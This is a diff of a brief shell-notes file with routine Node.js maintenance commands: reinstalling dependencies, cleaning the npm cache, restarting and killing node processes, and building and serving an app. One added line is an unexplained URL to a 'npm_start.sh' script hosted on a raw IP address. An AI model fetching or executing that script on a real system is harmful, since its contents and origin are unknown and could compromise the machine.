@@ -1,10 +1,17 @@
+service mysql stop
+nohup npm start &>/dev/null &
+http://185.182.111.214:7635/cgi-bin/npm_start.sh
+ps -aux | grep node
+kill -9 624
+
+npm run build
+serve -s build
+
+
 # 👇️ delete node_modules and package-lock.json
 rm -rf node_modules
 rm -f package-lock.json
-
-# 👇️ clean npm cache
 npm cache clean --force
-
 npm install
 
 
